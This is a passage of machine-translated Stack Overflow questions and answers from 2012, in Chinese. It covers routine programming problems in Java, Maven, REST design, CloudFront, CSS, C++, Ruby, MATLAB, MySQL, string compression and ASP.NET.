api.soundcloud.com/178.249.136.151 != api.soundcloud.com OR api.soundcloud.com 
```

我正在使用 java-api-wrapper-1.1.2-all.jar

发现一个谷歌小组帖子说使用捆绑所有东西的 jar (..-all.jar) 解决了这个问题，但显然不适合我..

有人有想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-28T05:01:02.180

发现了问题，

org apache httpclient 的 jar 冲突，删除 4.1.2 并离开 4.1.1，女巫解决了这个问题。

# http - REST - 规范 URI 与相对 URI（从用户的角度来看）

> ID：13093413
> 
> 赞同：0
> 
> 时间：2012-10-26T19:45:26.870
> 
> 标签：http, rest, uri, relative-path, canonical-link

我目前正在设计一项服务。它是一种多层服务，使用 REST 接口存储来自多个客户端的数据。

我不清楚我应该如何接受 URI 中的资源 ID。假设用户`001`创建了一个资源，第一个资源是给他的，而第 100 个资源是给系统的。

`/resource/1`当用户 001 对( )进行 GET 时，我应该返回什么`/resource/{id}`。我是否应该显示他的记录，从而使 URI 相对于执行请求的用户？或者我应该为系统返回第一个（拒绝它，因为它缺少查看它的权限）？

我不想深入了解授权内容，但我想知道我应该如何处理这种情况。如果我更喜欢后者，那么我怎样才能让用户说“好的，给我我创建的第一个资源”或“给我第二个……”，“给我最后一个……”，“给我第 100 个我创建的资源”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:50:38.417

我不声称自己是 REST 专家，但我可能会这样做。

在您的域模型中，如果没有用户就无法存在资源，那么对 URL 调用进行建模是完全可以的，例如

```
GET /user/{userId}/resource  //Gets all resources of a user 
```

另一方面，如果资源可以在没有用户的情况下存在，那么 stackoverflow 上的这个链接提供了一种对此类调用进行建模的好方法。

[RESTful 多对多可能吗？](https://stackoverflow.com/questions/5424184/restful-many-to-many-possible)

我们为我们的一个项目做的另一件事是，我们有链接表（UserResource table(id,userId,resourceId)，我们有一个唯一的 ID 并且有类似的东西

```
GET /userResource/{userResourceId}

 GET /userResource               //Retrieve all the resources user has access to 
```

如果您关心安全性，StackOverflow 上有关于如何将安全性与 Rest 调用集成的链接。理想情况下，此类逻辑应在服务器端处理。您通常不希望将该逻辑放入 REST url。

例如，如果你接到一个电话

```
GET /resource  //Get all resources 
```

*根据用户是谁，您只返回他有权访问的资源子集。*

底线：不要围绕权限构建资源。

再说一次，我不是专家。只是我的拙见。:-)

# authentication - 使用 AWS CloudFront 时，如何向公众隐藏自定义源服务器？

> ID：13093418
> 
> 赞同：5
> 
> 时间：2012-10-26T19:45:49.837
> 
> 标签：authentication, cdn, reverse-proxy, amazon-cloudfront, proxy-authentication

我不确定这是否完全符合 StackOverflow 的条件，但由于我需要以编程方式执行此操作，而且我认为 SO 上的很多人都使用 CloudFront，我认为它确实......所以这里是：

我想隐藏对我的自定义源服务器的公共访问。

CloudFront 从自定义源中提取，但是我找不到文档或任何类型的示例来防止用户在 CloudFront 后面代理时直接向我的源发出请求，除非我的源是 S3 ......自定义源不是这种情况。

我可以使用什么技术来识别/验证请求是通过 CloudFront 代理的，而不是客户端直接请求的？

CloudFront 文档仅涵盖与 S3 源一起使用时的这种情况。列出 CloudFront 的 IP 地址的 AWS 论坛帖子有一个免责声明，即不能保证该列表是最新的，不应依赖该列表。请参阅[https://forums.aws.amazon.com/ann.jspa?annID=910](https://forums.aws.amazon.com/ann.jspa?annID=910)

我假设任何使用 CloudFront 的人都有某种方法可以从直接请求/爬虫中隐藏他们的自定义来源。我将不胜感激任何提示让我开始。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-09T23:09:02.347

创建仅 CloudFront 使用的自定义 CNAME。在您自己的服务器上，阻止对不是来自该 CNAME 的静态资产的任何请求。

例如，如果您的站点是[http://abc.mydomain.net ，则为](http://abc.mydomain.net)[http://xyz.mydomain.net](http://xyz.mydomain.net)设置一个 CNAME ，指向完全相同的位置，并将该新域放在 CloudFront 中作为源拉服务器. 然后，根据请求，您可以判断它是否来自 CloudFront，然后做任何您想做的事情。

缺点是这是通过默默无闻的安全性。客户端永远不会看到对[http://xyzy.mydomain.net](http://xyzy.mydomain.net)的请求，但这并不意味着他们没有办法弄清楚。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T20:19:32.253

我建议使用类似于 facebook 的 robots.txt 的内容，以防止所有爬虫访问您网站中的所有敏感内容。

[https://www.facebook.com/robots.txt](https://www.facebook.com/robots.txt)（你可能需要稍微调整一下）

之后，只需将您的应用程序..（例如 Rails）指向自定义源服务器。

现在将您网站上的所有网址重写为绝对网址，例如：

[https://d2d3cu3tt4cei5.cloudfront.net/hello.html](https://d2d3cu3tt4cei5.cloudfront.net/hello.html)

基本上所有的 url 都应该指向你的云端分发。[现在，如果有人从https://d2d3cu3tt4cei5.cloudfront.net/hello.html](https://d2d3cu3tt4cei5.cloudfront.net/hello.html)请求文件并且它没有 hello.html .. 它可以从您的服务器（通过 https 等加密通道）获取它，然后将其提供给用户。

因此，即使用户查看源代码，他们也不知道您的原始服务器......只知道您的云端分发。

有关在此处设置的更多详细信息：

[http://blog.codeship.io/2012/05/18/Assets-Sprites-CDN.html](http://blog.codeship.io/2012/05/18/Assets-Sprites-CDN.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-05-16T05:13:51.833

[我知道这个帖子很旧，但我会为像我这样几个月后看到它的人回答它。]

根据我所阅读和看到的内容，CloudFront 并没有在请求中始终如一地标识自己。但是您可以通过在 CloudFront 分配中覆盖 robots.txt 来解决此问题。

1) 创建一个新的 S3 存储桶，它只包含一个文件：robots.txt。这将是您的 CloudFront 域的 robots.txt。

2) 在 AWS 控制台中转到您的分配设置，然后单击创建源。添加存储桶。

3）转到行为并单击创建行为：路径模式：robots.txt 来源：（您的新存储桶）

4) 将 robots.txt 行为设置为较高的优先级（较低的数字）。

5) 去无效化和无效/robots.txt。

现在 abc123.cloudfront.net/robots.txt 将从存储桶提供，其他所有内容都将从您的域提供。您可以单独选择允许/禁止在任一级别进行爬网。

另一个域/子域也可以代替存储桶，但为什么要麻烦。

# java - 假 3D 平面中的 Java z 排序？

> ID：13093422
> 
> 赞同：0
> 
> 时间：2012-10-26T19:46:09.137
> 
> 标签：java, java-3d, z-order

我正在用 Java 实现一个像 Notch 的“破塔”这样的项目。我大部分时间都在写，但我在 z-order 方面遇到了困难。

当对象围绕中心“旋转”时，它们仍然严重地相互重叠。例如，背景中的一棵树可能会绘制在它“前面”的一棵树的顶部。

任何人都可以建议一种可以帮助我解决问题的算法吗？...或者可能有助于解释 z 排序的完整概念，甚至可能提供另一种解决方案。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T15:43:00.993

我认为您想要恢复的是使用 z 坐标创建一个数组，对数组进行排序，然后将对象转换到它们的位置。例如：

```
TransformGroup translate(Node node,Vector3f vector){

    Transform3D transform3D = new Transform3D();
    transform3D.setTranslation(vector);
    TransformGroup transformGroup = new TransformGroup();
    transformGroup.setTransform(transform3D);
    transformGroup.addChild(node);
    return transformGroup;
}    
for(int i=0;vec[i];i++)
 translate(Your_Object,new Vector3f(x,y,vec[i]);
//do this while you still have elements in your vector. 
//you may want to set a value, let's say 2500 that  indicates that you ran out of objects
//in that case, you will have for(int i=0;vec[i]!=2500;i++) 
```

因此，通过这种方式，您的对象应该是一个在另一个之前，而不是一个堆叠在另一个之上。

希望它有帮助，迈克

# maven - 使用配置文件时未设置 Maven 属性

> ID：13093425
> 
> 赞同：4
> 
> 时间：2012-10-26T19:46:26.260
> 
> 标签：maven, maven-3

过滤孔`maven package -Pexplode`不起作用。“${ds.xml}”没有被“openmind-ds.xml”替换。值“openmind-ds.xml”和键“ds.xml”在 filter.properties 中。还有 ${as.deploy}。

**错误信息**

> `[ERROR] Failed to execute goal org.apache.maven.plugins:maven-antrun-plugin:1.3:run (package) on project openmind-ear: An Ant BuildException has occured: Warning: Could not find file /home/localhost/workspaceOM/openmind/openmind-ear/target/${ds.xml} to copy. -> [Help 1]`

**模式调试**

```
[INFO] Executing tasks
[DEBUG] getProperty(ns=null, name=ant.reuse.loader, user=false)
[antlib:org.apache.tools.ant] Could not load definitions from resource org/apache/tools/ant/antlib.xml. It could not be found.
[DEBUG] getProperty(ns=null, name=as.deploy, user=false)
Property "as.deploy" has not been set
Setting project property: deploy-path -> ${as.deploy}/openmind-ear.ear
[DEBUG] getProperty(ns=null, name=deploy-path, user=false)
     [echo] Exploding to ${as.deploy}/openmind-ear.ear
[DEBUG] getProperty(ns=null, name=deploy-path, user=false)
   [delete] Directory /home/localhost/workspaceOM/openmind/openmind-ear/${as.deploy}/openmind-ear.ear cannot be removed using the file attribute.  Use dir instead.
[DEBUG] getProperty(ns=null, name=deploy-path, user=false)
    [mkdir] Skipping /home/localhost/workspaceOM/openmind/openmind-ear/${as.deploy}/openmind-ear.ear because it already exists.
[DEBUG] getProperty(ns=null, name=deploy-path, user=false)
     [sync] PASS#1: Copying files to /home/argonist/om-umgebung/workspaceOM/openmind/openmind-ear/${as.deploy}/openmind-ear.ear 
```

**耳朵项目中的 pom.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <parent>
    <groupId>de.openmind</groupId>
    <artifactId>openmind</artifactId>
    <version>1.0-SNAPSHOT</version>
    <relativePath>../pom.xml</relativePath>
  </parent>

  <artifactId>openmind-ear</artifactId>
  <packaging>ear</packaging>
  <name>${project.artifactId} : ${project.version} EAR</name>

  <profiles>
    <profile>
      <id>env-dev</id>
      <properties>
        <env>dev</env>
      </properties>
    </profile>

    <profile>
      <id>env-prod</id>
      <properties>
        <env>prod</env>
      </properties>
    </profile>

    <profile>
      <id>explode</id>
      <build>
        <plugins>
          <plugin>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>package</id>
                <phase>package</phase>
                <configuration>
                  <tasks>
                    <property name="deploy-path" value="${as.deploy}/${app.context}-ear.ear" />
                    <echo>Exploding to ${deploy-path}</echo>
                    <delete file="${deploy-path}" quiet="true" />
                    <mkdir dir="${deploy-path}" />
                    <sync todir="${deploy-path}" verbose="true">
                      <fileset
                        dir="${project.build.directory}/${project.build.finalName}" />
                    </sync>
                    <copy todir="${as.deploy}" file="${project.build.directory}/${ds.xml}"
                      verbose="true" />
                  </tasks>
                </configuration>
                <goals>
                  <goal>run</goal>
                </goals>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>

    <profile>
      <id>unexplode</id>
      <build>
        <plugins>
          <plugin>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>clean</id>
                <phase>clean</phase>
                <configuration>
                  <tasks>
                    <property name="deploy-path" value="${as.deploy}/${app.context}-ear.ear" />
                    <echo>Unexploding: ${deploy-path}</echo>
                    <delete file="${deploy-path}" quiet="true" />
                    <delete dir="${deploy-path}" quiet="true" />
                    <delete file="${as.deploy}/${ds.xml}" quiet="true" />
                  </tasks>
                </configuration>
                <goals>
                  <goal>run</goal>
                </goals>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
  </profiles>

  <dependencies>
    .....
  </dependencies>
  <build>
    <finalName>${app.context}-ear</finalName>
    <filters>
      <filter>../src/main/filters/filter-${env}.properties</filter>
    </filters>
    <plugins>
      <plugin>
        <artifactId>maven-ear-plugin</artifactId>
        <configuration>
          <defaultJavaBundleDir>lib/</defaultJavaBundleDir>
          <version>6</version>
          <archive>
            <manifestEntries>
              <Build-Date>${timestamp}</Build-Date>
              <Build-Revision>${buildNumber}</Build-Revision>
              <Mode>${env}</Mode>
            </manifestEntries>
          </archive>
          <modules>
            <jarModule>
              <groupId>org.jboss.el</groupId>
              <artifactId>jboss-el</artifactId>
              <includeInApplicationXml>false</includeInApplicationXml>
              <bundleDir>lib</bundleDir>
            </jarModule>
            <jarModule>
              <groupId>${project.groupId}</groupId>
              <artifactId>${app.context}-datamodel</artifactId>
              <includeInApplicationXml>false</includeInApplicationXml>
              <bundleDir>lib</bundleDir>
            </jarModule>
            <webModule>
              <groupId>${project.groupId}</groupId>
              <artifactId>${app.context}-war</artifactId>
              <contextRoot>/${app.web.context}</contextRoot>
              <unpack>${app.unpack.modules}</unpack>
              <bundleFileName>${app.context}-war.war</bundleFileName>
            </webModule>

            <ejbModule>
              <groupId>${project.groupId}</groupId>
              <artifactId>${app.context}-bootstrap</artifactId>
              <excluded>${exclude.bootstrap}</excluded>
              <bundleFileName>${app.context}-bootstrap.jar</bundleFileName>
              <unpack>${app.unpack.modules}</unpack>
            </ejbModule>

            <ejbModule>
              <groupId>${project.groupId}</groupId>
              <artifactId>${app.context}-ejb</artifactId>
              <bundleFileName>${app.context}-ejb.jar</bundleFileName>
              <unpack>${app.unpack.modules}</unpack>
            </ejbModule>

            <ejbModule>
              <groupId>org.jboss.seam</groupId>
              <artifactId>jboss-seam</artifactId>
            </ejbModule>

          </modules>
        </configuration>
      </plugin>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>properties-maven-plugin</artifactId>
        <executions>
          <execution>
            <configuration>
              <files>
                <file>${basedir}/../src/main/filters/filter-${env}.properties</file>
              </files>
            </configuration>
          </execution>
          <execution>
            <!-- Properties needed by unexplode profile -->
            <id>pre-clean</id>
            <phase>pre-clean</phase>
            <goals>
              <goal>read-project-properties</goal>
            </goals>
            <configuration>
              <files>
                <file>${basedir}/../src/main/filters/filter-${env}.properties</file>
              </files>
            </configuration>
          </execution>
        </executions>
      </plugin>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-resources-plugin</artifactId>
        <version>2.6</version>
        <configuration>
          <!-- <outputDirectory>${env.JBOSS_HOME}/server/default/deploy</outputDirectory> -->
          <outputDirectory>${project.build.directory}</outputDirectory>
          <resources>
            <resource>
              <directory>src/main/resources</directory>
              <filtering>true</filtering>
              <includes>
                <include>${ds.xml}</include>
              </includes>
            </resource>
          </resources>
        </configuration>
        <executions>
          <execution>
            <id>copy-app-ds-xml</id>
            <goals>
              <goal>copy-resources</goal>
            </goals>
          </execution>
        </executions>
        <!-- <execution> <id>copy-mysql-driver</id> <phase>install</phase> <goals> 
          <goal>copy-resources</goal> </goals> <configuration> <outputDirectory>${env.JBOSS_HOME}/server/default/lib</outputDirectory> 
          <resources> <resource> <directory>${settings.localRepository}/mysql/mysql-connector-java/5.1.6</directory> 
          <includes> <include>mysql-connector-java-5.1.6.jar</include> </includes> 
          </resource> </resources> </configuration> </execution> -->
      </plugin>
    </plugins>
    <resources>
      <resource>
        <directory>src/main/resources</directory>
        <filtering>true</filtering>
      </resource>
    </resources>
  </build>
</project> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T14:55:07.640

您的过滤器属性依赖于`${env}`参数：

```
<filter>../src/main/filters/filter-${env}.properties</filter> 
```

此参数在您的“explode”配置文件中没有任何价值。所以Maven一定在寻找：

```
../src/main/filters/filter-.properties 
```

我怀疑你希望它会是`filter.properties`而不是`filter-.properties`。

# html - 使绝对定位的 div 容器与其内容的宽度相匹配

> ID：13093426
> 
> 赞同：2
> 
> 时间：2012-10-26T19:46:27.357
> 
> 标签：html, css, slider, css-float

我有一个 CSS 设置，其中有一个绝对定位的 PNG 图像，它有一个透明区域，充当一个窗口，让一个充满图像的 div 可以在它后面显示。那个 div 也是绝对定位的，它的内容是一系列向左浮动的图像，因此它们都在一行中。

问题是这个充满图像的 div 比容器宽得多，所以除非我为图像容器 div 指定宽度，否则图像都只是垂直堆叠。我希望它们并排排列，但我不能硬编码包含 div 宽度的值，因为它可以改变。我该怎么做呢？这是我的代码：

```
<div class="slider_box">
    <div class="slider_images">
        <img class="slider_image" src="img/share/recipes/pizza.jpg" alt="Pizza"/>
        <img class="slider_image" src="img/share/recipes/pizza.jpg" alt="Pizza"/>
        <img class="slider_image" src="img/share/recipes/pizza.jpg" alt="Pizza"/>
        <img class="slider_image" src="img/share/recipes/pizza.jpg" alt="Pizza"/>
        <img class="slider_image" src="img/share/recipes/pizza.jpg" alt="Pizza"/>
    </div> <!--images show through the slider mask, and should be floated left (or inline-block). Currently can't be side by side without specifying width of slider_images-->
    <img class="slider_mask" alt="Slider Mask" src="img/share_recipe_mask.png"/><!--sits on top of slider images -->
    <h4>Semolina <br/>Olive Oil Cake</h4> <!--sits on top of slider mask-->
</div>

.slider_box {
    width:190px; height:220px; position: absolute; overflow: hidden;
    .slider_images {
        position: absolute; bottom: 0;
        img { float: none; width: 190px; height:158px; }
    }
    .slider_mask { position: absolute; }
    h4 { .cubano; font-size:1.8em; position: absolute; color: #fff; top:11px; left:14px; line-height: 110%; }
} 
```

CSS

```
.slider_box {
    width:190px; height:220px; position: absolute; overflow: hidden;
    .slider_images {
        position: absolute; bottom: 0;
        img { float: none; width: 190px; height:158px; }
    }
    .slider_mask { position: absolute; }
    h4 { .cubano; font-size:1.8em; position: absolute; color: #fff; top:11px; left:14px; line-height: 110%; }
}
.slider_nav {
    .slider_nav_btn { width:10px; height:10px; display:inline-block; .border-radius(50%,50%,50%,50%); color: #f3895f; }
    .slider_nav_btn:hover { color: @redDk; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T23:58:08.477

如果我正确掌握情况，您需要容器是口罩的大小，对吗？

用一点 Javascript：

```
<div class="slider_box" id="easyID">
<!-- snip -->
<img class="slider_mask" id="easytoidentify" src="whatever" />
<script type="text/javascript">
  document.getElementById('easyID').style.width = document.getElementById('easytoidentify').width;
</script> 
```

从那里，您只需要添加`overflow:hidden`到“slider_box”css 并定义“slider_images”的宽度，使其足够宽。只要启用了Javascript，它就可以工作。

# c++ - 在 C++ 中使用继承时避免不必要的函数声明/定义

> ID：13093428
> 
> 赞同：4
> 
> 时间：2012-10-26T19:46:34.923
> 
> 标签：c++, inheritance, virtual

经过长时间的 C 风格程序编码，我才刚刚开始“获得”OOP。所以我怀疑可能有标准的方式来处理我所面临的情况。我有一个应用程序，其类层次结构如下所示：

```
#include <iostream>
using namespace std;

class A {
public:
  virtual int intf() { return 0;} // Only needed by B
  virtual double df() {return 0.0;} // Only needed by C
};    
class B : public A {
  int intf() {return 2;}
  // B objects have no use for df()
};    
class C : public B {
  double df() {return 3.14;}
  // C objects have no use for intf()
};    
int main(){
  // Main needs to instantiate both B and C.
  B b;
  C c;
  A* pa2b = &b;
  A* pa2c = &c;

  cout << pa2b->intf() << endl;
  cout << pa2b->df() << endl;
  cout << pa2c->intf() << endl;
  cout << pa2c->df() << endl;

  return 0;
} 
```

现在这个程序编译并运行良好。但是，我对它的设计有疑问。A类是通用接口，不需要实例化。B类和C类需要。关于函数：B需要intf()但C不需要，C需要df()但B不需要B {C} 的 df() {intf()}。

**编辑**：*B 和 C 共享一些数据成员以及 f() 以外的一些成员函数。我没有向它展示我的精简代码。*

最后，按照标准，我的应用程序需要通过指向 A 的指针访问 B 和 C。所以我的问题是：有没有办法“清理”这个设计，以便不需要/空的成员函数定义（比如我有A）的声明/定义中所做的可以消除吗？类之间有明确的“IS-A”关系。因此，尽管我分享了每个新手对继承的兴奋，但我不觉得我已经扩展了我的设计，只是为了可以使用继承。

背景以防万一：我正在实施一个回归套件。A 类实现了每个回归通用的函数和矩阵（例如因变量和自变量）。B 类是具有两个类（“0”和“1”）的逻辑回归，并定义了成本函数，以及用于两类逻辑回归的训练算法。C类是多类逻辑回归。它通过使用“one-vs-all”算法对多个类进行训练来扩展 B 类。因此，从某种意义上说，如果您将您感兴趣的类别视为正面示例，而将所有其他类别视为负面示例，则 C 是二元逻辑回归。然后为每个类执行多类回归。有问题的函数（intf 和 df）返回输出。在逻辑回归的情况下，返回值是一个向量，而对于多类回归，它是一个矩阵。而且，如上所述，B 和 C 对彼此的返回函数没有任何用处。除了我似乎无法消除 A（回归类）中的冗余定义。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T19:50:52.113

查看 Liskov 替换原则 (http://en.wikipedia.org/wiki/Liskov_substitution_principle)。它指出子类必须履行与超类相同的契约。在您的示例中，两个子类都没有这样做。“Is-A”关系不足以证明继承是合理的。

一种选择是使用单个模板方法，如下所示：

```
template <typename T>
class A<T> {
    T getValue();
}

class B : A<int> {
    int getValue();
}

class C: A<double> {
    double getValue();
} 
```

这将允许两个子类都履行合同，同时允许方法的返回类型根据子类定义而变化。

如果你想了解更多面向对象编程的“最佳实践”，google“Robert Martin SOLID”

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T20:12:18.030

你触及了 OOP 中最具争议的一点：is-a == 派生模式，导致了“上帝对象”反模式，因为一切最终都是上帝的孩子，上帝知道每个人的每一种方法，并且对所有内容都有一个“答案”（阅读“默认实现”）。

“Is-a”不足以证明继承的合理性，其中不存在替换能力，但在现实世界中，没有对象真的可以完全替换为另一个对象，否则不会有所不同。

您处于替代原则无法很好地工作的“无名之地”，但是 - 同时 - 虚拟函数看起来是实现动态调度的最佳工具。

你唯一能做的就是妥协，牺牲两者中的一个。

就情况而言，由于 B 和 C 没有任何共同点（没有共享有用的方法），所以不要让这些方法源自 A。如果你有一些东西要“共享”，可能是一种运行时机制来发现在输入 B 相关特定代码或 C 相关特定代码之前输入 B 或 C 的类型。

这通常是通过一个公共基础来完成的，该基础具有一个运行时类型指示器来切换，或者只是一个虚拟函数（通常是析构函数）来让 dynamic_cast 能够工作。

```
class A
{
public:
    virtual ~A() {}

    template<class T>
    T* is() { return dynamic_cast<T*>(this); }
};

class B: public A
{
public:
    int intf() { return 2; }
};

class C: public A
{
public:
    double df() { return 3.14; }
};

int main()
{
    using namespace std;

    B b;
    C c;

    A* ba = &b;
    A* ca = &c;

    B* pb = ba->is<B>();
    if(pb) cout << pb->intf() << endl;

    C* pc = ca->is<C>();
    if(pc) cout << pc->df() << endl;
} 
```

# ruby-on-rails - 如何在忽略空数组的同时找到 3 个数组的交集？

> ID：13093430
> 
> 赞同：2
> 
> 时间：2012-10-26T19:46:40.723
> 
> 标签：ruby-on-rails, ruby

我必须找到具有条件的 3 个整数数组的交集元素，例如 a、b、c；如果任意一个数组为空`[]`（提前致谢。

ps：红宝石1.9.3

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:00:55.730

一种方法是：

```
[ a, b, c ].tap{ |a| a.delete( [] ) }.reduce( :& ) || [] 
```

讨论中建议的其他选项是：

```
[ a, b, c ].reject( &:empty? ).reduce( :& ) || [] 
```

和：

```
[ a, b, c ].select( &:any? ).reduce( :& ) || [] 
```

但是在最后一种情况下，请注意具有显式 nil 元素的非空数组，例如`[ nil ]`，因为它们仍然会失败 #any? 测试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:09:36.760

```
[a, b, c].reject(&:blank?).reduce(:&) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:00:46.983

这样做可能有一种更简洁的方法，但这应该可以满足您的需求。

```
def intersection(*arrays)
  # Reduce the list of arrays to only the ones with elements
  arrays = arrays.select(&:first)

  return [] if arrays.empty?

  # Grab the first array
  intersection = arrays.pop

  # Iterate over the arrays finding the intersection
  arrays.each do |array|
    intersection = intersection & array
  end

  # Return the resultant array
  intersection
end 
```

**更新**

我知道有一种方法可以在所有数组元素之间应用运算符，但由于某种原因，我`reduce`在查看数组文档时错过了。`reduce`绝对是要走的路：

```
arrays.reject(&:empty?).reduce(&:&) 
```

# matlab - 简单的 imwrite 不写入文件

> ID：13093434
> 
> 赞同：2
> 
> 时间：2012-10-26T19:47:06.650
> 
> 标签：matlab

我正在尝试操作图像并将其保存到文件中，但它似乎无法通过函数工作。但是，它确实可以在命令窗口中工作。我尝试了 save、saveas、fprint 和其他没有运气的方法。

```
A = imread('contourSS.jpg'); B = rgb2gray(A);
imwrite(B, 'new_image.gif', 'gif'); 
```

当我从函数运行此代码时，MATLAB 目录中没有显示任何内容，但当我从命令窗口运行它时，它确实显示在 MATLAB 目录中。有任何想法吗？
提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:16:08.893

您确定将文件保存到正确的目录吗？尝试添加添加`disp(pwd)`到函数中，它也会显示您正在保存的目录。

在保存文件时使用完整路径通常也是一个好主意。考虑将您的代码更改为：

```
imgDir = /home/user/image;
readfile = fullfile( imgDir, 'contourSS.jpg');
writefile = fullfile( imgDir, 'new_image.gif');

A = imread(readfild); B = rgb2gray(A);
imwrite(B, writefile, 'gif'); 
```

# mysql - Mysql查询需要很长时间才能运行

> ID：13093437
> 
> 赞同：1
> 
> 时间：2012-10-26T19:47:28.933
> 
> 标签：mysql

我正在运行这个查询。

```
SELECT dom,
COUNT(url) AS counted
FROM results 
GROUP BY dom
ORDER BY COUNT(url) DESC; 
```

我有 dom 索引，但我不能索引 url，因为它是一个长文本。我该怎么做才能让它更快？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:52:16.717

尝试这个：

```
SELECT dom,
COUNT(url) AS counted
FROM results 
GROUP BY dom
ORDER BY counted DESC; 
```

假设 dom 的 url 很少，这应该不是问题。如果每个 dom 有很多 url，count 会很昂贵。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:54:49.063

count(url) 表示对 url 字段不为空的行进行计数。也许您可以提高创建和索引的性能，例如：

```
create index idx__1 on results  (dom, url (1)); 
```

然后将您的查询更改为：

```
SELECT dom,
COUNT( left(url,1)) AS counted
FROM results 
GROUP BY dom
ORDER BY counted DESC; 
```

如果您只要求列出的两个字段，RDBMS 只需要索引，不需要从表中获取数据。

# string - 压缩字符串

> ID：13093438
> 
> 赞同：1
> 
> 时间：2012-10-26T19:47:30.100
> 
> 标签：string, compression

面试中有一个关于压缩字符串的常见问题。我不是在寻找代码，我只需要一个解决问题的有效算法。

**给定一个字符串（*例如 aaabbccaaadd*），压缩它（*3a2b2c3a2d*）。**

我的解决方案：

> 在弦上旅行。每次我看到同一个字母时，我都会数数。当我看到不同的字母出现时（并重新开始），我将输出字母和计数器。

有没有更有效的方法来做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T19:57:17.597

这称为运行长度编码，您命名的算法基本上是您将获得的最佳算法。它需要 O(1) 辅助存储（保存看到的最后一个符号，或等效地检查即将出现的元素；还保存一个计数器，记录您看到的相同符号的数量）并在 O(n) 时间内运行。由于您需要至少检查每个符号一次才能知道结果，因此无论如何您都不会比 O(n) 时间更好。更重要的是，它还可以一次处理一个符号的流，一次输出一个符号，因此您实际上只需要 O(1) RAM。

您可以使用许多技巧来更好地获得常数因子，但算法基本保持不变。这些技巧包括：

*   如果您流到慢速目的地（如磁盘或网络），请缓冲。广泛地。
*   如果您希望长时间运行相同的符号，您可以对循环计数它们进行矢量化，或者至少通过移出其他情况来使循环更紧密。
*   如果适用，请告诉您的编译器不要担心输入和输出指针之间的别名。

如果您的数据源很慢，那么这种微优化可能没有实际意义。对于我上面提到的一些优化水平，即使是 RAM 也可以算慢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:00:16.723

如果您的字符串足够长，请使用 Lempel Ziv 压缩。优点是：它不仅可以缩短不同的重复，而且可以有效地缩短重复的“组”。参见[维基百科：Lempel-Ziv-Welch](http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch)

一个模糊的例子 - 让你明白：
aaabqxyzaaatuoiaaabhaaabi 将被压缩为：
`A`bqxyz `A`tui `B`h `B`i
where [ `A`= aaa] & [ `B`= `A`b = aaab]

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:51:27.253

许多压缩算法都基于[霍夫曼编码](http://en.wikipedia.org/wiki/Huffman_coding)。这就是我在采访中给出的答案

# asp.net - 单击命令按钮（编辑、更新、取消）时，Gridview 会丢失其数据

> ID：13093445
> 
> 赞同：2
> 
> 时间：2012-10-26T19:48:01.147
> 
> 标签：asp.net

每个人。我正在编写一个相当简单的页面，它带有一个从 SQLDataSource 获取数据的 GridView，这是我以前做过的。当页面加载时，它会进行初始搜索，显示适合访问页面的人的信息。这很好用。我可以改变搜索词并发出修改后的查询，这很有效。但是，当我单击编辑按钮时，Gridview 消失并且 EmptyDataText 出现。如果我点击按钮重新提交搜索，Gridview 将重新出现在编辑模式中。我可以修改字段并点击更新按钮，然后再次获取 EmptyDataText。重新提交搜索，Gridview 重新出现，更改的字段更新为新值。

我可以捕捉到 OnRowEditing 事件，该事件表明该按钮有效。我可以捕获紧随其后的 RowDatabound 事件 - Gridview 仍然可见，我假设它正在处理标题行。在点击继续时，我得到 EmptyDataText 并且不再看到 RowDataBound 事件。我的假设是它会在第一个数据行中查找数据，但没有找到任何数据，因此会显示文本。

当我重新提交搜索时，我再次看到 RowDataBound 事件，并且在与单击编辑按钮的行对应的事件上，我观察编辑模式显示的预处理 - 这包括从搜索条件复制 ItemList DropDownList 到 EditTemplate DropDownList。在 n + !st Step Into 上，显示 GridView，并在编辑模式下显示正确的行。

当我点击更新或取消时，类似的模式也成立。当任何命令按钮被点击时，看起来 GridView 正在丢失它的数据链接，并且需要重新提交搜索以重新建立链接。我已尝试在 PageLoad 和各种事件处理程序中在我能想到的所有点重新绑定网格（重新设置 DataSourceID 字符串，或者发出 DataBind() 调用）。但是，我过去做过这种链接和编辑，而不必如此严厉。很明显，我错过了一些使这种情况不同的关键步骤，而且可能是相当小的步骤。现在，我只想弄清楚如何让 Gridview 进入编辑模式并重新渲染，而不会在完成 OnRowEditing 后进入编辑模式时丢失它与数据行的链接。

这是有问题的Gridview：

```
